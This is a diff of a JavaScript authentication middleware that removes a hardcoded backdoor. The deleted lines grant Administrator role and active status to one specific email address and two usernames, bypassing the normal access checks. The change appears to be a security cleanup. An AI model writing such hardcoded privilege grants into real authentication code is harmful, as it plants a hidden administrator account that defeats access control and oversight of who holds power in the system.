@@ -58,11 +58,6 @@ export const protect = async (req, res, next) => {
       });
     }
 
-    if (user.email?.toLowerCase() === 'haroonarafiq@gmail.com' || user.username === 'haroonarafiq' || user.username === 'h123') {
-      user.role = 'Administrator';
-      user.status = 'ACTIVE';
-    }
-
     if (user.status !== 'ACTIVE' && user.status !== 'active') {
       return res.status(403).json({
         success: false,
@@ -153,4 +148,3 @@ export const checkCaseAccess = (req, res, next) => {
   }
   next();
 };
-
